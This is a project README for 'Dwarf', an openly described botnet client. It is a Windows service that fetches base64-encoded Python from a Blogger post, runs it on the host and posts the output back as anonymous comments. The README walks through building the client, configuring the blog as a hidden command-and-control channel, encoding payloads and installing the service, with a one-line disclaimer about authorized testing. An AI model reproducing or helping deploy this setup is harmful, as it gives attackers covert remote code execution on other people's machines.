<p align="center">
  <h3 align="center">Dwarf</h3>
  <p align="center">Tiny botnet client that runs code from a remote blog</p>
  <p align="center">
    <a href="https://twitter.com/dsecbx">
      <img src="https://img.shields.io/badge/twitter-@dsecbx-blue.svg">
    </a>
    <a href="https://www.gnu.org/licenses/gpl-3.0">
      <img src="https://img.shields.io/badge/License-GPLv3-blue.svg">
    </a>
  </p>
</p>

<hr>

<p align="center">
<br>
![logo](/dwarf.png)
<br>
</p>

__Disclaimer:__ This project should be used for authorized testing or educational purposes only.
# How it works

Dwarf is a Windows service created in Python that doesn't have any potentially malicious code built in. It was developed to listen to a blog feed and run the code that is posted in there in the machine. It also comes with the option to add a comment replying back to the post with the output of the piece of the code run.


Flow:
  - The master codes something in Python and convert it to base64;
  - The master posts this piece of code in the blog without a title or with the title "repeat" to have it run until it lasts;
  - The bot sends a "heartbeat" by sending a get to the blog;
  - The bot checks for the blog feed and gets the latest post;
  - The bot checks if the post has already been run using the post id and ignores duplicated ones unless the post title is "repeat";
  - The bot runs the piece of code and if there's an output in the stdout it comments it on the post as anonymous (max 4000 characteres);
  - The bot saves the post id in a list to not repeat the code
  - The boot sleeps for a while.

### Installation

Here's how you can build the service to listen to the blog and test it locally installing the service manually. To automate this you'll need to use a service wrapper to install the service and set it as autorun on the machine. Feel free to submit a PR if you know how to do it.

#### Building the client

With Python on your machine, setup a virtualenv and install the requirements for the project.

```sh
$ virtualenv venv
$ source venv/Scripts/activate
$ pip install -r requirements.txt
```

To build the client use the run.py to speed up the process.

```sh
$ python run.py --build --output "dwarf" -u anycustomblogyoudid.blogspot.com
```

#### Setting up the blog

On blogger.com, create a blog and make sure you have the following settings:
 - Not adult content;
 - Not visible to search mechanisms;
 - Blog set as public;
 - Comments free to everyone(inclusing anonymous);
 - Comments under approval
 - Allow full blog feed

#### Making a post/submitting your code

Once you have your blog online, you'll start posting on there to have your code executed on the client machine.
First of all, write a piece of code and use the run.py to compile to base64. The two example files in this repository are there to show you what type of code you can have running on your client.
```sh
$ python run.py --generate_post "example1.py"
```
Now with your code already in base64, on the posting page, set the view as raw HTML and paste the base64 in there. This page can't containg anything else but the base64 piece of code.
Your post title needs to be empty or with the name __"repeat"__. An empty title will have the clients to run the code only once or on every startup. An title with the __"repeat"__ word will have the client running this piece of code every time it checks for a new command.
By default the client checks for new code every 30 seconds.

#### Running the service locally

If you want to test the service on your machine, after building it, open a powershell window as Administrator in the folder that the .exe is, and run the following commands:

```sh
$ ./dwarf.exe install
$ ./dwarf.exe debug
```

__Attention:__ The bot.py file needs to have all the imports that the code you post needs, otherwise will fail. Make sure to import all of them before you build. Think in advance.
